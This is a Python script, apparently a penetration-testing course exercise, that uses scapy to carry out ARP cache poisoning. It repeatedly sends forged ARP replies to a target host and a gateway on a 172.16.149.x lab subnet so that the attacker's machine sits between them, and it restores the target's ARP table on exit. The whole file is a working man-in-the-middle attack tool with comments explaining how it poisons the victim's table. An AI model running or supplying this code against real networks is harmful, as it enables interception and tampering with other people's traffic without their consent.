import sys
import time

import scapy.all as scapy
from scapy.layers.l2 import *
scapy.conf.verb = 0

def main():
    packets_sent = 0;
    try:
        while True:
            spoof("172.16.149.129", get_mac("172.16.149.129"), "172.16.149.2")
            print(get_mac("172.16.149.129"))
            spoof("172.16.149.2", get_mac("172.16.149.2"), "172.16.149.129")
            print(get_mac("172.16.149.2"))
            packets_sent += 2
            print(f"\r[+] Sent {packets_sent} packets", end="")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        # destination is the target machine, source is the router
        reset("172.16.149.129", "172.16.149.2")
        print("\n[+] Detected CTRL+C - quitting")

def reset(destination, source):
    # restore the ARP table on target machine
    packet = scapy.ARP(op=2, pdst=destination, hwdst=get_mac(destination), psrc=source, hwsrc=get_mac(source))
    print(packet.show())
    print(packet.summary())
    scapy.send(packet, verbose=False)


def get_mac(ip):
    # create an arp request directed to broadcast MAC asking for IP
    # Part 1 - ask who has the target IP
    arp_request = ARP(pdst=ip)
    #arp_request.show()
    # print(arp_request.summary())
    # Part 2 - set destination MAC to Broadcast MAC; involves combining frames to broadcast
    # packets.  Involves creating a frame
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # broadcast.show()
    # scapy.ls(scapy.Ether())
    # print(broadcast.summary())
    # create the frame
    arp_request_broadcast = broadcast / arp_request
    # print(arp_request_broadcast.summary())
    #arp_request_broadcast.show()
    # send packet and capture response
    # return data as a list of dictionaries
    clients_lists = []
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    for element in answered_list:
        clients_lists.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
        # print(f"{element[1].psrc}\t\t{element[1].hwsrc}")
    # print(clients_lists[0]["mac"])
    return clients_lists[0]["mac"]

def spoof(target_ip, target_mac, spoof_ip):

    # set the target machine - ip and mac address
    # set the source field as the router
    # sends a packet to the victim, saying I have the routers address
    # this associates the ip address of the router with the MAC address of the kali machine
    # in the ARP table of the target
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(f"packet.show(): {packet.show()}")
    # print(f"packet.summary(): {packet.summary()}")
    # send the packet and poison the table
    # this will change the MAC address associated with the psrc address
    scapy.send(packet, verbose=False)







if __name__ == "__main__":
    main()

